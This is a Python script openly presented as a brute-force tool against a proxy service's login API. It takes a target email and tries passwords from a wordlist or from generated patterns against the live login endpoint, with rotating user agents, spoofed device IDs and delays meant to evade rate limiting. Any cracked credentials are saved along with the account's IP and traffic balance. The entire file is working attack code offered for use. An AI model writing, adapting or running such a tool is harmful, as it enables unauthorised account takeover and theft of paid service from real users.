import requests
import random
import string
import json
from colorama import init, Fore, Back, Style
from datetime import datetime
import os
import time

# Initialize colorama
init(autoreset=True)

# Banner
def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + """
SKIDDD TOOL DEVELOPER BY @RITH
    """)
    print(Fore.RED + "          Cherryproxy Brute Force v1.0 | Modified from RITHCYBER TEAM")
    print(Fore.WHITE + "="*50 + "\n")

def random_string(pattern):
    result = []
    for char in pattern:
        if char == '?':
            continue
        elif char == 'n':
            result.append(random.choice(string.ascii_lowercase))
        elif char == 'd':
            result.append(random.choice(string.digits))
        else:
            result.append(char)
    return ''.join(result)

def get_random_ua():
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    ]
    return random.choice(ua_list)

def check_account(email, password, delay=1):
    time.sleep(delay)  # Add delay to avoid rate limiting
    device_id = random_string("?n?n?n?n?ncb672653737f65feb9cff4e?d?d?d?d")
    random_ua = get_random_ua()

    login_data = {
        "email": email,
        "password": password,
        "device_num": device_id,
        "time_zone": "UTC+8:00",
        "lang": "en",
        "session": ""
    }

    headers = {
        "User-Agent": random_ua,
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    try:
        response = requests.post(
            "https://api.360proxy.com/web/user/login",
            data=login_data,
            headers=headers,
            timeout=10
        )

        if "User does not exist" in response.text:
            return {"status": "invalid", "email": email, "password": password}
        elif '"code":0' in response.text:
            data = json.loads(response.text)
            user_data = data.get('data', {}).get('user', {})
            return {
                "status": "valid",
                "email": email,
                "password": password,
                "username": user_data.get('username', ''),
                "ip_num": user_data.get('ip_num', ''),
                "flow": user_data.get('flow', '')
            }
        else:
            return {"status": "unknown", "email": email, "password": password}

    except Exception as e:
        return {"status": "error", "email": email, "password": password, "error": str(e)}

def main():
    print_banner()
    
    # Get target email
    email = input(Fore.GREEN + "[?] Enter target email address: " + Fore.WHITE).strip()
    
    # Get password source
    print(Fore.GREEN + "\n[1] Password wordlist file")
    print(Fore.GREEN + "[2] Generate passwords using pattern")
    choice = input(Fore.GREEN + "[?] Select password source (1/2): " + Fore.WHITE).strip()
    
    passwords = []
    
    if choice == '1':
        # Read from wordlist
        wordlist_path = input(Fore.GREEN + "[?] Enter path to password wordlist: " + Fore.WHITE)
        if not os.path.isfile(wordlist_path):
            print(Fore.RED + "[!] File not found!")
            return
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    elif choice == '2':
        # Generate passwords
        pattern = input(Fore.GREEN + "[?] Enter password pattern (use ?n for letter, ?d for digit, e.g., '?n?n?n?d?d?d'): " + Fore.WHITE)
        count = int(input(Fore.GREEN + "[?] How many passwords to generate? " + Fore.WHITE))
        
        for _ in range(count):
            password = []
            for char in pattern:
                if char == '?':
                    continue
                elif char == 'n':
                    password.append(random.choice(string.ascii_letters))
                elif char == 'd':
                    password.append(random.choice(string.digits))
                else:
                    password.append(char)
            passwords.append(''.join(password))
    else:
        print(Fore.RED + "[!] Invalid choice!")
        return
    
    if not passwords:
        print(Fore.RED + "[!] No passwords to test!")
        return
    
    print(Fore.GREEN + f"\n[+] Loaded {len(passwords)} passwords to test")
    print(Fore.YELLOW + "[~] Starting brute force attack...\n")
    
    # Results container
    valid_accounts = []
    
    # Process each password
    for i, password in enumerate(passwords, 1):
        print(Fore.WHITE + f"[{i}/{len(passwords)}] Trying {password}...", end=' ')
        
        result = check_account(email, password)
        
        if result['status'] == 'valid':
            print(Fore.GREEN + "VALID")
            valid_accounts.append(result)
            break  # Stop if valid password found
        elif result['status'] == 'invalid':
            print(Fore.RED + "INVALID")
        else:
            print(Fore.YELLOW + "ERROR")
    
    # Save results
    if valid_accounts:
        with open('BruteForce_Results.txt', 'w') as f:
            for acc in valid_accounts:
                f.write(f"Success! Valid credentials found:\n")
                f.write(f"Email: {acc['email']}\n")
                f.write(f"Password: {acc['password']}\n")
                f.write(f"Username: {acc['username']}\n")
                f.write(f"IPs Available: {acc['ip_num']}\n")
                f.write(f"Traffic Available: {acc['flow']}\n")
                f.write("-"*50 + "\n")
        print(Fore.GREEN + f"\n[+] Valid account found and saved to BruteForce_Results.txt")
    else:
        print(Fore.RED + "\n[!] No valid passwords found for this email")

if __name__ == "__main__":
    main()